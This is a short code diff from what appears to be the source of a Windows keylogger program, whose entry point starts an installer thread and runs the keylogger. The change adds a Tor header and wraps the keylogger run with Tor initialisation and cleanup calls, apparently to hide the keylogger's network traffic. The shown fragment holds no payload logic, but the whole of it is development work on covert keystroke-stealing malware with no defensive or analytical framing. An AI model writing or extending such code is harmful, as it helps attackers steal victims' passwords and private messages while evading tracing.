@@ -3,6 +3,7 @@
 #include "Logger.h"
 #include "Keylogger.h"
 #include "Installer.h"
+#include "Tor.h"
 
 DWORD WINAPI ProcInstall(LPVOID lpParameter)
 {
@@ -34,7 +35,9 @@ extern "C" int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, L
 #endif
 
 	VLog(LMESSAGE, L"Started");
+	TOR_Init();
 	keylogger.Run();
+	TOR_Cleanup();
 
 	CloseHandle(hSem);
 	return 0;
